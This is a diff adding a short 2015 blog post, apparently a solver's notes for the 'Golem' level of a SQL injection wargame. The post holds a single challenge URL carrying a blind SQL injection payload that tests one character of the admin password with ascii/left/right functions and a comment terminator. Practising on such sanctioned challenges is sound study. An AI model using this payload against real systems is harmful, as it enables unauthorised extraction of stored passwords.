@@ -1,0 +1,12 @@
+---
+layout: post
+title: LOS Golem 
+date: 2015-10-19 11:24:00 +0900
+category: Hacking
+---
+```
+http://los.sandbox.cash/chall/golem_9433f16f7a3899d7cf3fe48330f22018.php?pw=%27||ascii(right(left(pw,9),1))%3C100%20%26%26id%20like%20%27admin%27%23
+
+```
+
+
